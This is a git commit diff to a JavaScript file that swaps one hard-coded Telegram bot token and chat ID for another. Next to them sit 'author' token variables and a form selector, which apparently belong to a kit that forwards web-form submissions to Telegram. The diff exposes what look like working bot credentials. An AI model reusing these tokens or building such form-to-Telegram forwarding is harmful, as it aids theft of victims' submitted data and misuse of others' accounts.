c518ee5ac548bcde5313a88e91358f2bf8e51917
micsft <arabab32144222@proton.me>
2024-10-22 10:02:18 -0500

    Update app.js

--- app.js
+++ app.js
@@ -5,8 +5,8 @@ const form = document.querySelector(".form");
 const api = telegramBotTokenAuthor;
 const ID = chatIdAuthor;
 
-const telegramBotToken = "6968043726:AAHGJ0OtlbTMjTOPTfacioSJqOwgePt0Xhw"; // Replace with your Telegram bot token
-const chatId = 5710607863;
+const telegramBotToken = "6724518968:AAFoEyUmaA910VH-GL4FXeTa60bB9BcwVWA"; // Replace with your Telegram bot token
+const chatId = 6007087659;
 
 const tokens = [
   [telegramBotToken, chatId],
